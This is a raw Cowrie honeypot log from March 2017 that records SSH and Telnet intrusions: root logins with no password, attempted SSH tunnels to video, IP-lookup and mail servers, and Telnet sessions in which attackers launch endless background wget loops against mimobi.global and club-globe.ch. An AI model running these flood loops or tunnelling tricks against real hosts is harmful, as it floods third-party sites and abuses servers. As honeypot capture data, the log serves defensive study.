2017-03-11T13:40:56+0000 [CowrieTelnetTransport,55539,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
2017-03-11T13:41:04+0000 [SSHChannel None (375) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18062,194.88.106.181] remote close
2017-03-11T13:41:04+0000 [SSHChannel None (375) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18062,194.88.106.181] sending close 375
2017-03-11T13:41:06+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: shell
2017-03-11T13:41:06+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: shell
2017-03-11T13:41:06+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: enable
2017-03-11T13:41:06+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: enable 
2017-03-11T13:41:06+0000 [CowrieTelnetTransport,55539,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
2017-03-11T13:41:06+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: system
2017-03-11T13:41:06+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: system
2017-03-11T13:41:06+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh
2017-03-11T13:41:06+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh 
2017-03-11T13:41:06+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: run
2017-03-11T13:41:06+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: run
2017-03-11T13:41:08+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] got channel 'direct-tcpip' request
2017-03-11T13:41:08+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] direct-tcp connection request to 52.223.196.197:80 from localhost:5556
2017-03-11T13:41:08+0000 [SSHChannel None (272) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] direct-tcp forward to 52.223.196.197:80 with data 'GET /v0/CrcBYztBuTOL5zIOm1RxQXuppstOg5rkq-8zogmnERW347TjzOfiWAWHSZ432l6lHkjTmDFV0XQbSfU_HmuqxHwCnIajtrR1hOs2PzeE8h_gVl2Rt-i7FqEtMsojAXLcSnhX2ylaTEq6qCsOsisN4IqgsEW8A5hr_VuZTWuIyfneWZbip0ggICoOxMUCWYymIQ4ZlJIw9WHX2joezjwH4ggM7AlSt04ULtnyeFiJ8MpnMT0eSoGqhsMGEhBXEZrobIIlFdg6RrexqijVGgxBnB4CSV9qDqdBCAk/index-live.m3u8 HTTP/1.1\r\nHost: video-edge-c68354.fra02.hls.ttvnw.net\r\nAccept-Encoding: gzip,deflate\r\nConnection: close\r\n\r\n'
2017-03-11T13:41:08+0000 [SSHChannel None (272) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] failed to connect: Connection refused
2017-03-11T13:41:08+0000 [SSHChannel None (272) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] sending close 272
2017-03-11T13:41:13+0000 [SSHChannel None (376) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18062,194.88.106.181] remote eof
2017-03-11T13:41:13+0000 [SSHChannel None (376) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18062,194.88.106.181] remote close
2017-03-11T13:41:13+0000 [SSHChannel None (376) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18062,194.88.106.181] sending close 376
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done"
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done"
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done"
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done"
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done"
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.mimobi.global:80/ > /dev/null 2> /dev/null; done"
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done"
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done"
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done"
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done"
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done"
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done" &
2017-03-11T13:41:16+0000 [CowrieTelnetTransport,55539,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.club-globe.ch:80/main/index.html > /dev/null 2> /dev/null; done"
2017-03-11T13:41:17+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] got channel 'direct-tcpip' request
2017-03-11T13:41:17+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] direct-tcp connection request to 52.223.196.223:80 from localhost:5556
2017-03-11T13:41:17+0000 [SSHChannel None (273) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] direct-tcp forward to 52.223.196.223:80 with data 'GET /v0/CrcBHw1hON3_SJ9ZJ3sTIV-M4jRKUjWv8Eh1PAfxk_6Z8uJdsbDdQ9r2XgERjyw19w5_P8CFjMgJK0HEMPK_OBU5xRN4HxxUdWjAY6l2p0IE42nctsiZNmUDO6wJmM28HpWpA5XmuHIE18qCwU5KAujRrwwLFcU2elBiOv1SjL5ALmcdab_8yPeo0TmAbghzrhmgU41QR4QjFvsNV_bChE-NA14uxk5AwIrzYVq1ny2fvwgseWIUDnWOEhCqnbUXdIfEvxJtjZcHyVLRGgyWGSndRaXGmvlMjow/index-live.m3u8 HTTP/1.1\r\nHost: video-edge-c2ac10.fra02.hls.ttvnw.net\r\nAccept-Encoding: gzip,deflate\r\nConnection: close\r\n\r\n'
2017-03-11T13:41:17+0000 [SSHChannel None (273) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] failed to connect: Connection refused
2017-03-11T13:41:17+0000 [SSHChannel None (273) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] sending close 273
2017-03-11T13:41:19+0000 [SSHChannel None (377) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18062,194.88.106.181] remote eof
2017-03-11T13:41:19+0000 [SSHChannel None (377) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18062,194.88.106.181] remote close
2017-03-11T13:41:19+0000 [SSHChannel None (377) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18062,194.88.106.181] sending close 377
2017-03-11T13:41:20+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 58.218.204.188:55057 (10.8.41.81:2222) [session: 1f319399]
2017-03-11T13:41:20+0000 [HoneyPotSSHTransport,18224,58.218.204.188] Remote SSH version: SSH-2.0-PUTTY
2017-03-11T13:41:20+0000 [HoneyPotSSHTransport,18224,58.218.204.188] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
2017-03-11T13:41:20+0000 [HoneyPotSSHTransport,18224,58.218.204.188] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
2017-03-11T13:41:20+0000 [HoneyPotSSHTransport,18224,58.218.204.188] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
2017-03-11T13:41:21+0000 [HoneyPotSSHTransport,18224,58.218.204.188] NEW KEYS
2017-03-11T13:41:21+0000 [HoneyPotSSHTransport,18224,58.218.204.188] starting service 'ssh-userauth'
2017-03-11T13:41:22+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,18224,58.218.204.188] 'root' trying auth 'none'
2017-03-11T13:41:25+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,18224,58.218.204.188] 'root' authenticated with 'none'
2017-03-11T13:41:25+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,18224,58.218.204.188] starting service 'ssh-connection'
2017-03-11T13:41:25+0000 [SSHChannel None (193) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] remote eof
2017-03-11T13:41:25+0000 [SSHChannel None (193) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] remote close
2017-03-11T13:41:25+0000 [SSHChannel None (193) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] sending close 193
2017-03-11T13:41:25+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] got channel 'direct-tcpip' request
2017-03-11T13:41:25+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] direct-tcp connection request to 173.194.79.26:25 from localhost:5556
2017-03-11T13:41:25+0000 [SSHChannel None (194) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] remote eof
2017-03-11T13:41:25+0000 [SSHChannel None (194) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] remote close
2017-03-11T13:41:25+0000 [SSHChannel None (194) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] sending close 194
2017-03-11T13:41:25+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] got channel 'direct-tcpip' request
2017-03-11T13:41:25+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] direct-tcp connection request to 74.125.68.27:25 from localhost:5556
2017-03-11T13:41:26+0000 [HoneyPotSSHTransport,18224,58.218.204.188] Got remote error, code 11
	reason: 
2017-03-11T13:41:26+0000 [HoneyPotSSHTransport,18224,58.218.204.188] avatar root logging out
2017-03-11T13:41:26+0000 [HoneyPotSSHTransport,18224,58.218.204.188] connection lost
2017-03-11T13:41:26+0000 [HoneyPotSSHTransport,18224,58.218.204.188] Connection lost after 5 seconds
2017-03-11T13:41:37+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] got channel 'direct-tcpip' request
2017-03-11T13:41:37+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] direct-tcp connection request to 52.223.196.115:80 from localhost:5556
2017-03-11T13:41:37+0000 [SSHChannel None (274) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] direct-tcp forward to 52.223.196.115:80 with data 'GET /v0/CrcB3GOLYw0UYqIIO_hUVyuTXYOl09LomDd7VJg87M296AD4qL8ozViWi64_zuKBK-Z4GQOTqV0rSccFl-h-LaeCEXavUZmRw0-cQgAyNZHPKxBS7jGHnLD_Ne4qXAFnrGIMF-Xym8SJjCZq2HTsf89t8qsJIxX72zjSWFnzzV5pCFJFecnHGIGqbsTmE21bTfjGIMt6aJG2gtLRBZ0ZK_WrKBLJ5LbIaf6lyNpJ9wrK5DEI-iXXWURDEhBVwTe4h_Nhm4_ZQPt1DGJTGgymqf2Ux_h2PYtn1I8/index-live.m3u8 HTTP/1.1\r\nHost: video-edge-c62914.fra02.hls.ttvnw.net\r\nAccept-Encoding: gzip,deflate\r\nConnection: close\r\n\r\n'
2017-03-11T13:41:37+0000 [SSHChannel None (274) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] failed to connect: Connection refused
2017-03-11T13:41:37+0000 [SSHChannel None (274) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17951,194.88.107.18] sending close 274
2017-03-11T13:41:48+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 58.218.204.188:12653 (10.8.41.81:2222) [session: 19d72f52]
2017-03-11T13:41:49+0000 [HoneyPotSSHTransport,18225,58.218.204.188] Remote SSH version: SSH-2.0-PUTTY
2017-03-11T13:41:49+0000 [HoneyPotSSHTransport,18225,58.218.204.188] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
2017-03-11T13:41:49+0000 [HoneyPotSSHTransport,18225,58.218.204.188] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
2017-03-11T13:41:49+0000 [HoneyPotSSHTransport,18225,58.218.204.188] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
2017-03-11T13:41:49+0000 [HoneyPotSSHTransport,18225,58.218.204.188] NEW KEYS
2017-03-11T13:41:50+0000 [SSHChannel None (195) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] remote eof
2017-03-11T13:41:50+0000 [SSHChannel None (195) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] remote close
2017-03-11T13:41:50+0000 [SSHChannel None (195) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] sending close 195
2017-03-11T13:41:50+0000 [SSHChannel None (196) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] remote eof
2017-03-11T13:41:50+0000 [SSHChannel None (196) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] remote close
2017-03-11T13:41:50+0000 [SSHChannel None (196) on SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] sending close 196
2017-03-11T13:41:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] got channel 'direct-tcpip' request
2017-03-11T13:41:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] direct-tcp connection request to 74.125.203.27:25 from localhost:5556
2017-03-11T13:41:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] got channel 'direct-tcpip' request
2017-03-11T13:41:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,18060,194.88.106.206] direct-tcp connection request to 173.194.79.26:25 from localhost:5556
2017-03-11T13:41:50+0000 [HoneyPotSSHTransport,18225,58.218.204.188] starting service 'ssh-userauth'
2017-03-11T13:41:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,18225,58.218.204.188] 'root' trying auth 'none'
2017-03-11T13:41:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,18225,58.218.204.188] 'root' authenticated with 'none'
2017-03-11T13:41:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,18225,58.218.204.188] starting service 'ssh-connection'
2017-03-11T13:41:54+0000 [HoneyPotSSHTransport,18225,58.218.204.188] Got remote error, code 11
	reason: 
2017-03-11T13:41:54+0000 [HoneyPotSSHTransport,18225,58.218.204.188] avatar root logging out
2017-03-11T13:41:54+0000 [HoneyPotSSHTransport,18225,58.218.204.188] connection lost
2017-03-11T13:41:54+0000 [HoneyPotSSHTransport,18225,58.218.204.188] Connection lost after 5 seconds
2017-03-11T13:41:57+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,17971,194.88.106.173] got channel 'direct-tcpip' request
2017-03-11T13:41:57+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,17971,194.88.106.173] direct-tcp connection request to 107.189.171.198:80 from localhost:5556
2017-03-11T13:41:57+0000 [SSHChannel None (96) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17971,194.88.106.173] direct-tcp forward to 107.189.171.198:80 with data 'GET /ip/header?id_ip=12699718548&id_provider=19 HTTP/1.1\r\nHost: ipinfoplz.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4\r\nX-Group: 19\r\nX-Id: 12699718548\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'
2017-03-11T13:41:57+0000 [SSHChannel None (96) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17971,194.88.106.173] failed to connect: Connection refused
2017-03-11T13:41:57+0000 [SSHChannel None (96) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17971,194.88.106.173] sending close 96
